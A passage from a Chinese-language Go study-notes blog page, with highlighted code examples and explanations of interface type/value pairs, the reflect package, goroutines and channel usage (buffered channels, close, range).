title="1.变量的内置pair结构"></a>1.变量的内置pair结构</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">变量</span></span><br><span class="line"><span class="comment">||</span></span><br><span class="line"><span class="comment">  type        value-&gt; pair</span></span><br><span class="line"><span class="comment">||</span></span><br><span class="line"><span class="comment">static type concrete type</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">string</span></span><br><span class="line"><span class="comment">//pair&lt;static type:string,value:&quot;abcd&quot;&gt;</span></span><br><span class="line">a = <span class="string">&quot;abcd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pair&lt;type:string,value:&quot;abcd&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> allType <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">allType = a</span><br><span class="line"></span><br><span class="line">str, _ := allType.(<span class="type">string</span>)</span><br><span class="line">fmt.Println(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109165116718.png" alt="image-20230109165116718"></p><p><strong>知识点：</strong></p><p>(1) 每个变量都内置一个键值对(type, value)</p><p>(2) 变量不管给谁赋值，变量的pair都不会改变（<strong>pair连续传递</strong>）</p><p><strong>一些例子：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//tmp: pair&lt;type:*os.File, value:&quot;D:\Temp\tmp.txt&quot;文件描述符&gt;</span></span><br><span class="line">tmp, err := os.OpenFile(<span class="string">&quot;D:\\Temp\\tmp.txt&quot;</span>, os.O_RDWR, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;error&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//r: pair&lt;type: , value: &gt;</span></span><br><span class="line"><span class="keyword">var</span> r io.Reader</span><br><span class="line"><span class="comment">//r: pair&lt;type:*os.File, value:&quot;D:\Temp\tmp.txt&quot;文件描述符&gt;</span></span><br><span class="line">r = tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">//w: pair&lt;type: , value: &gt;</span></span><br><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line"><span class="comment">//w: pair&lt;type:*os.File, value:&quot;D:\Temp\tmp.txt&quot;文件描述符&gt;</span></span><br><span class="line">w = r.(io.Writer)</span><br><span class="line"></span><br><span class="line">w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello world!!\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</span><br><span class="line">ReadBook()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">WriteBook()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Book)</span></span> ReadBook() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Read...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Book)</span></span> WriteBook() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Write...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//b:pair&lt;type:Book,value:book&#123;&#125;的地址&gt;</span></span><br><span class="line">b := &amp;Book&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//r:pair&lt;type: , value: &gt;</span></span><br><span class="line"><span class="keyword">var</span> r Reader</span><br><span class="line"><span class="comment">//r: pair&lt;type:Book,value:book&#123;&#125;的地址&gt;</span></span><br><span class="line">r = b</span><br><span class="line"></span><br><span class="line">r.ReadBook()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> w Writer</span><br><span class="line"><span class="comment">//w: pair&lt;type:Book,value:book&#123;&#125;的地址&gt;</span></span><br><span class="line">w = r.(Writer)</span><br><span class="line">w.WriteBook()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109165629812.png" alt="image-20230109165629812"></p><h2 id="2-使用reflect获取变量的value和type"><a href="#2-使用reflect获取变量的value和type" class="headerlink" title="2.使用reflect获取变量的value和type"></a>2.使用reflect获取变量的value和type</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reflectNum</span><span class="params">(arg <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;type: &quot;</span>, reflect.TypeOf(arg))</span><br><span class="line">fmt.Println(<span class="string">&quot;value: &quot;</span>, reflect.ValueOf(arg))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> num <span class="type">float64</span> = <span class="number">1.2345</span></span><br><span class="line">reflectNum(num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109165849877.png" alt="image-20230109165849877"></p><h2 id="3-使用reflect获取类对象的字段和方法"><a href="#3-使用reflect获取类对象的字段和方法" class="headerlink" title="3.使用reflect获取类对象的字段和方法"></a>3.使用reflect获取类对象的字段和方法</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id   <span class="type">int</span></span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this User)</span></span> Call() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;user is called&quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, this)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user := User&#123;<span class="number">1</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="number">8</span>&#125;</span><br><span class="line">DoFileAndMethod(user)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DoFileAndMethod</span><span class="params">(input <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="comment">//获取input的type</span></span><br><span class="line">inputType := reflect.TypeOf(input)</span><br><span class="line">fmt.Println(<span class="string">&quot;inputType: &quot;</span>, inputType.Name())</span><br><span class="line"><span class="comment">//获取input的value</span></span><br><span class="line">inputValue := reflect.ValueOf(input)</span><br><span class="line">fmt.Println(<span class="string">&quot;inputValue: &quot;</span>, inputValue)</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过type获取里面的字段</span></span><br><span class="line"><span class="comment">//1. 获取interface的reflect.Type ,通过Type得到NumField,进行遍历</span></span><br><span class="line"><span class="comment">//2.得到每个field, 数据类型</span></span><br><span class="line"><span class="comment">//3. 通过field有一个Interface()方法得到对应的value</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; inputType.NumField(); i++ &#123;</span><br><span class="line">field := inputType.Field(i)</span><br><span class="line">value := inputValue.Field(i).Interface()</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %v = %v\n&quot;</span>, field.Name, field.Type, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过type获取里面的方法，调用</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; inputType.NumMethod(); i++ &#123;</span><br><span class="line">m := inputType.Method(i)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %v\n&quot;</span>, m.Name, m.Type)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109170055450.png" alt="image-20230109170055450"></p><h1 id="九、goroutine和channel"><a href="#九、goroutine和channel" class="headerlink" title="九、goroutine和channel"></a>九、goroutine和channel</h1><h2 id="1-创建一个goroutine"><a href="#1-创建一个goroutine" class="headerlink" title="1.创建一个goroutine"></a>1.创建一个goroutine</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newTask</span><span class="params">()</span></span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">fmt.Printf(<span class="string">&quot;new goroutine : i = %d\n&quot;</span>, i)</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主goroutine</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//创建一个go程(goroutine),去执行newTask</span></span><br><span class="line"><span class="keyword">go</span> newTask()</span><br><span class="line"></span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">fmt.Printf(<span class="string">&quot;main goroutine : i = %d\n&quot;</span>, i)</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109203711121.png" alt="image-20230109203711121"></p><p><strong>知识点：</strong></p><p>(1) 使用<strong>go</strong>关键字可以开启一个go程</p><p>(2) 可以使用go加匿名函数来创建一个go程，详情见下面的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="comment">// &quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">//用go创建承载一个形参为空，返回值为空的一个函数</span></span><br><span class="line"><span class="comment">go func()&#123;</span></span><br><span class="line"><span class="comment">defer fmt.Println(&quot;A.defer&quot;)</span></span><br><span class="line"><span class="comment">func() &#123;</span></span><br><span class="line"><span class="comment">defer fmt.Println(&quot;B.defer&quot;)</span></span><br><span class="line"><span class="comment">//退出当前goruntine</span></span><br><span class="line"><span class="comment">// runtime.Goexit()</span></span><br><span class="line"><span class="comment">fmt.Println(&quot;B&quot;)</span></span><br><span class="line"><span class="comment">&#125;()</span></span><br><span class="line"><span class="comment">fmt.Println(&quot;B&quot;)</span></span><br><span class="line"><span class="comment">&#125;()</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">bool</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a =&quot;</span>,a,<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;(<span class="number">10</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//死循环，防止主go程死掉，导致子go程死掉</span></span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：使用go+func创建go程后要在最后使用括号调用函数</p><h2 id="2-创建一个channel"><a href="#2-创建一个channel" class="headerlink" title="2.创建一个channel"></a>2.创建一个channel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.当main协程先到达num := &lt;- c，会发生阻塞，等待子协程运行到c &lt;- 666，然后唤醒main协程</span></span><br><span class="line"><span class="comment">// 2.当子协程先到达c &lt;- 666，同样会发生阻塞，等待主协程读取后再唤醒子协程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//定义一个channel</span></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;go1结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;go1正在运行....&quot;</span>)</span><br><span class="line"></span><br><span class="line">c &lt;- <span class="number">666</span> <span class="comment">//将666发送给c</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">num := &lt;-c <span class="comment">//从c中接收数据，赋值给num</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;num = &quot;</span>, num)</span><br><span class="line">fmt.Println(<span class="string">&quot;main gorountine结束&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109204659473.png" alt="image-20230109204659473"></p><p><strong>知识点：</strong></p><p>(1) 使用**make(chan int)**声明并初始化一个int类型的channel</p><p>(2) 在channel中读数据: <strong>num :&#x3D; &lt;-c</strong>  ,写数据：<strong>c &lt;- 666</strong></p><h2 id="3-带缓冲的channel"><a href="#3-带缓冲的channel" class="headerlink" title="3.带缓冲的channel"></a>3.带缓冲的channel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//定义一个带缓冲的channel</span></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">//len是当前缓存有多少元素，cap是缓存的容量</span></span><br><span class="line">fmt.Println(<span class="string">&quot;len(c) = &quot;</span>, <span class="built_in">len</span>(c), <span class="string">&quot;cap(c)&quot;</span>, <span class="built_in">cap</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;子go程结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">c &lt;- i</span><br><span class="line">fmt.Println(<span class="string">&quot;子go程正在运行 len(c) = &quot;</span>, <span class="built_in">len</span>(c), <span class="string">&quot;cap(c)&quot;</span>, <span class="built_in">cap</span>(c))</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">num := &lt;-c</span><br><span class="line">fmt.Println(<span class="string">&quot;num =&quot;</span>, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109210026928.png" alt="image-20230109210026928"></p><p><strong>知识点：</strong></p><p>(1) 当子go程向channel写了3个元素之后，由于主go程的Sleep,并没有人读channel，导致子go程阻塞。随后，主go程睡醒，读取三个元素然后结束，就导致了子go程的defer语句没有输出</p><p>(2) 当channel满了之后，再想写入就会阻塞当前go程</p><h2 id="4-使用close关闭channel"><a href="#4-使用close关闭channel" class="headerlink" title="4.使用close关闭channel"></a>4.使用close关闭channel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">c &lt;- i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//close可以关闭一个channel</span></span><br><span class="line"><span class="built_in">close</span>(c)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">//当ok为false时，表示channel已经关闭且为空；否则返回true</span></span><br><span class="line"><span class="keyword">if</span> data, ok := &lt;-c; ok &#123;</span><br><span class="line">fmt.Println(data)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109210719855.png" alt="image-20230109210719855"></p><p><strong>知识点：</strong></p><p>(1) channel关闭就不可以写了，但是可以接着读</p><h2 id="5-使用range来不断迭代操作channel"><a href="#5-使用range来不断迭代操作channel" class="headerlink" title="5.使用range来不断迭代操作channel"></a>5.使用range来不断迭代操作channel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">c &lt;- i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//close可以关闭一个channel</span></span><br><span class="line"><span class="built_in">close</span>(c)</span><br><span class="line">&#125;()</span><br><span 